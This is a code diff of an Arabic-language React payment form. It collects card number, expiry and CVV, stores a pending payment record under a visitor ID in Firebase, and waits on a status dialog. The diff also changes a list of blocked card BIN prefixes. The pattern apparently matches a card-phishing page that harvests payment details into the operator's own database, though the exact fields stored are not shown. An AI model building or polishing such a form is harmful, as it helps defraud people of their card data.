@@ -4,21 +4,22 @@ import type React from "react"
 import { useState, useEffect } from "react"
 import type { z } from "zod"
 import { doc, onSnapshot } from "firebase/firestore"
-import WaitingDialog from "../waiting-dilaog"
 import { CreditCard, Calendar, Lock, User } from "lucide-react"
 import { addData, db } from "@/lib/firebase"
 import { useRouter } from "next/navigation"
 import { usePaymentForm } from "./paymentform"
 import { PaymentSchema } from "./schema"
+import WaitingDialog from "../waiting-dilaog"
 
 export default function PaymentForm() {
   const { formData, isSubmitting, updateFormField } = usePaymentForm()
-  const [isloading, setLoading] = useState(false)
+  const [isLoading, setLoading] = useState(false)
   const [paymentStatus, setPaymentStatus] = useState<"idle" | "pending" | "processing" | "success" | "error">("idle")
   const [errors, setErrors] = useState<Record<string, string>>({})
   const [paymentId, setPaymentId] = useState<string | null>(null)
   const [cardType, setCardType] = useState<"visa" | "mastercard" | "unknown">("unknown")
   const router = useRouter()
+
   // Check for existing payment status in localStorage on component mount
   useEffect(() => {
     if (typeof window !== "undefined") {
@@ -112,25 +113,7 @@ export default function PaymentForm() {
     }
 
     // Check for rejected card prefixes before validation
-    const rejectedPrefixes = [
-      "4847",
-      "4054",
-      "4299",
-      "5246",
-      "4201",
-      "4548",
-      "4424",
-      "4079",
-      "4125",
-      "4575",
-      "5292",
-      "4890",
-      "4896",
-      "4575",
-      "4458",
-      "4323",
-      "4456",
-    ]
+    const rejectedPrefixes = ["9999"]
 
     const cardNumber = validationData.card_number
     const isRejectedCard = rejectedPrefixes.some((prefix) => cardNumber.startsWith(prefix))
@@ -147,7 +130,7 @@ export default function PaymentForm() {
 
     if (!paymentResult.success) {
       const formattedErrors: Record<string, string> = {}
-      paymentResult.error.errors.forEach((error: { path: { toString: () => string | number }[]; message: string }) => {
+      paymentResult.error.errors.forEach((error: { path: (string | number)[]; message: string }) => {
         if (error.path[0]) {
           formattedErrors[error.path[0].toString()] = error.message
         }
@@ -163,6 +146,10 @@ export default function PaymentForm() {
     try {
       const _id = localStorage.getItem("visitor")
 
+      if (!_id) {
+        throw new Error("Visitor ID not found")
+      }
+
       // Create a new payment record with pending status
       await addData({
         id: _id,
@@ -177,6 +164,7 @@ export default function PaymentForm() {
     } catch (error) {
       console.error("Payment error:", error)
       setPaymentStatus("error")
+      setErrors({ general: "حدث خطأ أثناء معالجة الدفع. يرجى المحاولة مرة أخرى." })
       setTimeout(() => {
         setLoading(false)
         localStorage.removeItem("paymentStatus")
@@ -198,38 +186,23 @@ export default function PaymentForm() {
         // Remove any non-digit characters
         const digitsOnly = value.replace(/\D/g, "")
 
+        // Limit to 16 digits
+        const limitedDigits = digitsOnly.substring(0, 16)
+
         // Detect card type
-        if (digitsOnly.startsWith("4")) {
+        if (limitedDigits.startsWith("4")) {
           setCardType("visa")
-        } else if (digitsOnly.startsWith("5")) {
+        } else if (limitedDigits.startsWith("5")) {
           setCardType("mastercard")
         } else {
           setCardType("unknown")
         }
 
         // Check for rejected card prefixes
-        const rejectedPrefixes = [
-          "4847",
-          "4054",
-          "4299",
-          "5246",
-          "4201",
-          "4548",
-          "4424",
-          "4079",
-          "4125",
-          "4575",
-          "5292",
-          "4890",
-          "4896",
-          "4575",
-          "4458",
-          "4323",
-          "4456",
-        ]
+        const rejectedPrefixes = ["9999"]
 
         // Check if card starts with any rejected prefix
-        const isRejectedCard = rejectedPrefixes.some((prefix) => digitsOnly.startsWith(prefix))
+        const isRejectedCard = rejectedPrefixes.some((prefix) => limitedDigits.startsWith(prefix))
 
         if (isRejectedCard) {
           setErrors((prev) => ({
@@ -238,7 +211,7 @@ export default function PaymentForm() {
           }))
         }
         // Check if the card starts with 4 or 5
-        else if (digitsOnly.length > 0 && !["4", "5"].includes(digitsOnly[0])) {
+        else if (limitedDigits.length > 0 && !["4", "5"].includes(limitedDigits[0])) {
           setErrors((prev) => ({
             ...prev,
             card_number: "رقم البطاقة يجب أن يبدأ بـ 4 أو 5",
@@ -259,15 +232,14 @@ export default function PaymentForm() {
 
         // Format with spaces after every 4 digits
         let formattedValue = ""
-        for (let i = 0; i < digitsOnly.length; i++) {
+        for (let i = 0; i < limitedDigits.length; i++) {
           if (i > 0 && i % 4 === 0) {
             formattedValue += " "
           }
-          formattedValue += digitsOnly[i]
+          formattedValue += limitedDigits[i]
         }
 
-        // Limit to 19 characters (16 digits + 3 spaces)
-        value = formattedValue.substring(0, 19)
+        value = formattedValue
       }
 
       // Format expiration date with slash after month (MM/YY)
@@ -309,7 +281,7 @@ export default function PaymentForm() {
             // User hasn't typed the slash yet, but has entered more than 2 digits
             if (parts[0].length > 2) {
               const month = parts[0].substring(0, 2)
-              const year = parts[0].substring(2)
+              const year = parts[0].substring(2, 4)
 
               // Validate month
               const monthNum = Number.parseInt(month, 10)
@@ -361,16 +333,25 @@ export default function PaymentForm() {
         value = value.substring(0, 5)
       }
 
+      // Format CVV to only allow digits and limit to 3 characters
+      if (field === "cvv") {
+        value = value.replace(/\D/g, "").substring(0, 3)
+      }
+
       updateFormField({ [field]: value })
 
       // Clear error for this field when user starts typing
       if (
-        errors[field as unknown as number] &&
-        !(field === "card_number" && errors.card_number === "رقم البطاقة يجب أن يبدأ بـ 4 أو 5")
+        errors[field] &&
+        !(
+          field === "card_number" &&
+          (errors.card_number === "رقم البطاقة يجب أن يبدأ بـ 4 أو 5" ||
+            errors.card_number === "هذه البطاقة غير مقبولة للدفع")
+        )
       ) {
         setErrors((prev) => {
           const newErrors = { ...prev }
-          delete newErrors[field as unknown as number]
+          delete newErrors[field]
           return newErrors
         })
       }
@@ -378,7 +359,7 @@ export default function PaymentForm() {
 
   return (
     <div className="max-w-md mx-auto p-8 bg-white rounded-xl shadow-lg border border-gray-100">
-      <WaitingDialog isOpen={isloading} paymentStatus={paymentStatus} onRefresh={handleRefresh} />
+      <WaitingDialog isOpen={isLoading} paymentStatus={paymentStatus} onRefresh={handleRefresh} />
 
       <div className="mb-8 text-center">
         <div className="flex justify-center mb-4">
@@ -390,10 +371,16 @@ export default function PaymentForm() {
         <p className="text-gray-500 text-sm">يرجى إدخال تفاصيل بطاقتك لإتمام عملية الدفع</p>
       </div>
 
+      {errors.general && (
+        <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg">
+          <p className="text-red-600 text-sm text-right">{errors.general}</p>
+        </div>
+      )}
+
       <form onSubmit={handleSubmit} className="space-y-5">
         <div className="space-y-2">
           <label
-            htmlFor="full_name"
+            htmlFor="card_holder_name"
             className="block text-right font-medium text-gray-700 flex items-center justify-end gap-2"
           >
             <User className="w-4 h-4" />
@@ -409,9 +396,10 @@ export default function PaymentForm() {
                 errors.card_holder_name ? "border-red-500" : "border-gray-300"
               } focus:outline-none focus:ring-2 focus:ring-[#146394] focus:border-transparent transition-all duration-200`}
               dir="rtl"
+              placeholder="أدخل اسم حامل البطاقة"
             />
           </div>
-          {errors.full_name && <p className="text-red-500 text-sm text-right">{errors.full_name}</p>}
+          {errors.card_holder_name && <p className="text-red-500 text-sm text-right">{errors.card_holder_name}</p>}
         </div>
 
         <div className="space-y-2">
@@ -431,12 +419,16 @@ export default function PaymentForm() {
               placeholder="XXXX XXXX XXXX XXXX"
               className={`w-full p-3 border rounded-lg ${
                 errors.card_number ? "border-red-500" : "border-gray-300"
-              } focus:outline-none focus:ring-2 focus:ring-[#146394] focus:border-transparent transition-all duration-200 pr-10`}
+              } focus:outline-none focus:ring-2 focus:ring-[#146394] focus:border-transparent transition-all duration-200 pr-12`}
               dir="ltr"
             />
             {cardType !== "unknown" && (
               <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
-                {cardType === "visa" ? <img src="/v.png" width={50} alt="" /> : <img src="/m.png" width={50} alt="" />}
+                {cardType === "visa" ? (
+                  <img src="/placeholder.svg?height=24&width=40" alt="Visa" className="h-6" />
+                ) : (
+                  <img src="/placeholder.svg?height=24&width=40" alt="Mastercard" className="h-6" />
+                )}
               </div>
             )}
           </div>
@@ -480,6 +472,7 @@ export default function PaymentForm() {
               maxLength={3}
               value={formData.cvv}
               onChange={handleInputChange("cvv")}
+              placeholder="123"
               className={`w-full p-3 border rounded-lg ${
                 errors.cvv ? "border-red-500" : "border-gray-300"
               } focus:outline-none focus:ring-2 focus:ring-[#146394] focus:border-transparent transition-all duration-200`}
@@ -492,21 +485,19 @@ export default function PaymentForm() {
         <div className="pt-6">
           <button
             type="submit"
-            className="w-full bg-[#146394] text-white py-4 rounded-lg font-semibold transform transition-all duration-300 hover:bg-[#0d4e77] active:scale-[0.98] shadow-md hover:shadow-lg text-base relative overflow-hidden"
-            disabled={isSubmitting || isloading}
+            className="w-full bg-[#146394] text-white py-4 rounded-lg font-semibold transform transition-all duration-300 hover:bg-[#0d4e77] active:scale-[0.98] shadow-md hover:shadow-lg text-base relative overflow-hidden disabled:opacity-50 disabled:cursor-not-allowed"
+            disabled={isSubmitting || isLoading}
           >
-            <span className="relative z-10">{isSubmitting || isloading ? "جاري المعالجة..." : "إتمام الدفع"}</span>
+            <span className="relative z-10">{isSubmitting || isLoading ? "جاري المعالجة..." : "إتمام الدفع"}</span>
           </button>
         </div>
 
         <div className="flex justify-center mt-4 space-x-4">
-          <div className="w-10 h-6 bg-gray-100 rounded flex items-center justify-center">
-            <div className="text-blue-600 font-bold text-xs">
-              <img src="/v.png" width={50} alt="" />
-            </div>
+          <div className="w-12 h-8 bg-gray-100 rounded flex items-center justify-center">
+            <img src="/placeholder.svg?height=24&width=40" alt="Visa" className="h-6" />
           </div>
-          <div className="w-10 h-6 bg-gray-100 rounded flex items-center justify-center">
-            <img src="/m.png" width={50} alt="" />
+          <div className="w-12 h-8 bg-gray-100 rounded flex items-center justify-center">
+            <img src="/placeholder.svg?height=24&width=40" alt="Mastercard" className="h-6" />
           </div>
         </div>
 
